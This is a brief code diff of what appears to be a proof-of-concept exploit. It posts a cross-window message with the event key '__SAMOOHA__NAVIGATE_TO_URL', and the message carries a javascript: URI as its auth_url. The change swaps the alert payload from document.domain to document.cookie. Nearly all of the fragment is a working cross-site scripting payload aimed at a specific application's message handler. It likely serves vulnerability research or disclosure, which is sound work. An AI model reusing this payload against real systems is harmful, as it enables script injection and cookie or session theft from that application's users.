@@ -25,7 +25,7 @@ components.html("""
         try {
             f.contentWindow.postMessage({
                 eventKey: "__SAMOOHA__NAVIGATE_TO_URL",
-                data: { auth_url: "javascript:alert(document.domain);" }
+                data: { auth_url: "javascript:alert(document.cookie);" }
             }, "*");
             console.log("[+] postMessage enviado");
         } catch (e) {
